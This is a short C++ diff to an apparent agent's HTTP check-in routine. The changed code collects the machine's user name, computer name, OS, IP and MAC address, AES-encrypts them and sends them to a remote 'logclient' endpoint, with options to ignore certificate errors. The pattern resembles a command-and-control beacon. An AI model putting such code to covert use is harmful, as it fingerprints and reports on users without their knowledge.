@@ -117,7 +117,9 @@ void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring req
 			std::string logclient_data = "uid=" + uid + "&computername=" + computername + "&os=" + osversion + "&username=" + username +
 				"&localipaddress=" + ipaddress + "&physicaladdress=" + macaddress;
 
-			std::string encrypted_logclient_data = libcrypt::encrypt(aespassword, logclient_data);
+			std::string encrypted_logclient_data = "data=" + libcrypt::encrypt(aespassword, logclient_data);
+
+			logclient_data = "";
 
 			if (!HTTPS_CONNECTION) {
 				std::wcout << "[HTTP] " << "Sending data with HTTP packet" << std::endl;
@@ -127,7 +129,7 @@ void libagent::test_http_protocol(std::wstring host, WORD port, std::wstring req
 			}
 
 			if (connection != NULL) {
-				request = libhttp::json_request(connection, requestMethod, logclienturi, (char*)logclient_data.c_str(),
+				request = libhttp::json_request(connection, requestMethod, logclienturi, (char*)encrypted_logclient_data.c_str(),
 					logclient_headers.c_str(), IGNORE_CERT_UNKNOWN_CA, IGNORE_CERT_DATE_INVALID, HTTPS_CONNECTION);
 			}
 
